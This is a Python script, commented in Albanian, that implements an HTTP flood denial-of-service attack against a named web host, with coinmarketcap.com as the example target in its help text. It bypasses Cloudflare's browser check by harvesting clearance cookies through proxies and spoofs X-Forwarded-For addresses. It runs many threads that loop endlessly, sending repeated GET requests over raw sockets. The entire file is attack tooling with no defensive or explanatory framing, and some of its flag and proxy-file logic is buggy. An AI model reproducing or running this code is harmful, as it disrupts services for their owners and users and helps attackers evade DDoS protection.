# -*- coding: utf-8 -*-
import cfscrape, socket, urllib.request, ssl
import _thread, threading, random, argparse
from time import sleep

def main():
    if args.proxy_file != None:
        proxyget()

    global go
    global x
    x = 0
    go = threading.Event()
    if is_protected_by_cf():
        print("[*] Serveri", args.host, "ka gjeneruar mekanizmin mbrojtes te Cloudflare")
        for i in range(args.threads):
            _thread.start_new_thread(generate_cf_token, (i,)) # Kalkulo CF token
        sleep(120)
        print("[*] Sulmi DoS eshte inicuar")
        for x in range(args.threads):
            set_request_cf()
            RequestProxyHTTP(x + 1).start()
        go.set()
    else:
        print("[*] Serveri", args.host, "nuk ka gjeneruar mekanizem mbrojtes te Cloudflare")
        for x in range(args.threads):
            _thread.start_new_thread(set_request, ()) # Dergo kerkesen, nuk ka nevoje per kalkulime
        sleep(5)
        print("[*] Sulmi DoS eshte inicuar")
        for x in range(args.threads):
            request = random.choice(request_list)
            if args.ssl:
                RequestDefaultHTTP(x + 1).start()
            else:
                RequestDefaultHTTPS(x + 1).start()
        go.set()

def usage():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', nargs="?", help="Web serveri, p.sh: coinmarketcap.com",required=True)
    parser.add_argument('-d', '--dir', default="", help="Web path, p.sh: admin/index.php (Default: /)")
    parser.add_argument('-s', '--ssl', dest="ssl", action="store_false", help="HTTP/HTTPS (Default OFF)")
    parser.add_argument('-p', '--port', default=80,help="Port #, 80 ose 443 (Default 80)", type=int)
    parser.add_argument('-t', '--threads', default=100, help="Numri i fijeve/threads (Default 100)", type=int)
    parser.add_argument('-x', '--proxy_file', help="Tekst fajlli per proxy (Opcionale)")
    return parser.parse_args()

# Kontrollo UA Generation (Mesazhi i zakonshem nga Cloudflare: Checking your browser before accessing (X web server))
def is_protected_by_cf():
	find_keyword = False
	f = urllib.request.urlopen(url)
	response = str(f.read())

	if "Checking your browser before accessing" in response:
		find_keyword = True

	return find_keyword

# Formimi i HTTP kerkeses nese is_protected_by_cf() => False
def set_request():
    global request
    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    useragent = "User-Agent: Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1\r\n"
    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request = get_host + useragent + accept + \
              connection + "\r\n"
    request_list.append(request)

# Formimi i HTTP kerkeses nese is_protected_by_cf() => True
def set_request_cf():
    global request_cf
    global proxy_ip
    global proxy_port
    cf_combine = random.choice(cf_token).strip().split("#")
    proxy_ip = cf_combine[0]
    proxy_port = cf_combine[1]
    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    tokens_and_ua = cf_combine[2]
    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
    randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
               "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    forward = "X-Forwarded-For: " + randomip + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"

# Gjenero cookies/useragent per CF kalkulime
def generate_cf_token(i):
    proxy = proxy_list[i].strip().split(":")
    proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
    try:
        cookie_value, user_agent = cfscrape.get_cookie_string(url, proxies=proxies)
        tokens_string = "Cookie: " + cookie_value + "\r\n"
        user_agent_string = "User-Agent: " + user_agent + "\r\n"
        cf_token.append(proxy[0] + "#" + proxy[1] + "#" + tokens_string + user_agent_string)
    except:
        pass

# Lexo proxy.list fajllin dhe popullo proxy_list array
def proxyget():
    proxy_file = open(args.proxy_file_location, "r")
    line = proxy_file.readline().rstrip()
    while line:
        proxy_list.append(line)
        line = proxy_file.readline().rstrip()
    proxy_file.close()

# Klasa DoS ne rastin kur serveri eshte nuk eshte i pajisur me SSL/TLS certifikate
class RequestDefaultHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s.send(str.encode(request))
                # print("Kerkesa eshte derguar @", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

# Klasa DoS ne rastin kur serveri eshte i pajisur me SSL/TLS certifikate
class RequestDefaultHTTPS(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,
                                    ssl_version=ssl.PROTOCOL_SSLv23)
                s.send(str.encode(request))
                # print("Kerkesa eshte derguar @", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

# Klasa ne rastin kur perdoren serverat ndermjetesues
class RequestProxyHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy_ip), int(proxy_port)))
                s.send(str.encode(request_cf))
                # print ("HTTP kerkesa eshte derguar nga " + str(proxy_ip + ":" + proxy_port) + " @", self.counter)
                try:
                    for y in range(50):
                        s.send(str.encode(request_cf))
                except:
                    pass
            except:
                pass

if __name__ == "__main__":
    args = usage()

    request_list = []
    proxy_list = []
    cf_token = []

    if args.ssl:
        url = "http://" + args.host
    else:
        url = "https://" + args.host

    main()